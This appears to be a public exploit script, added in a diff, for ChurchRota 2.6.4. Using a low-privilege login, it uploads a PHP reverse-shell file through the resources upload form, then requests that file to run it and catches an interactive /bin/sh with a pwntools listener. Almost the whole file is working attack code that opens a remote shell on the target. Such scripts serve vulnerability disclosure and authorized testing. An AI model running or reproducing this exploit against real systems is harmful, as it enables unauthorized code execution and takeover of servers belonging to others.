@@ -1,0 +1,48 @@
+# Exploit Title: ChurchRota 2.6.4 - RCE (Authenticated)
+# Date: 1/19/2021
+# Exploit Author: Rob McCarthy (@slixperi)
+# Vendor Homepage: https://github.com/Little-Ben/ChurchRota
+# Software Link: https://github.com/Little-Ben/ChurchRota
+# Version: 2.6.4
+# Tested on: Ubuntu
+
+import requests
+from pwn import listen
+
+############################################################################################################
+# Description                                                                                              #
+# Church Rota version 2.6.4 is vulnerable to authenticated remote code execution.                          #
+# The user does not need to have file upload permission in order to upload and execute an arbitrary file.  #
+# The application is written primarily with PHP so we use PHP in our PoC                                   #
+############################################################################################################
+
+# credentials of the low privilege user
+USERNAME='slixperi'
+PASSWORD='slixperi'
+
+LISTENER_IP = '127.0.0.1'
+LISTENER_PORT = '4444'
+TARGET_IP = '127.0.0.1'
+TARGET_PORT = '8081'
+
+# set the credentials for login POST
+credentials = {"username":USERNAME,"password":PASSWORD}
+# create a session to preserve session state
+sesh = requests.session()
+# login as our low-privilege user (normally only admins can upload files)
+sesh.post(f"http://{TARGET_IP}:{TARGET_PORT}/login.php", data=credentials)
+
+# define the payload
+payload = f"<?php $sock=fsockopen(\"{LISTENER_IP}\",{LISTENER_PORT});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"
+
+# file upload
+sesh.headers.update({"Referer": f"http://{TARGET_IP}:{TARGET_PORT}/resources.php?action=new"})
+files = {'resourcefile': ("shell.php", payload)}
+sesh.post(f"http://{TARGET_IP}:{TARGET_PORT}/resources.php?action=newsent", files=files)
+
+l = listen(LISTENER_PORT)
+
+# execute the file
+sesh.get(f"http://{TARGET_IP}:{TARGET_PORT}/documents/shell.php")
+
+l.interactive()
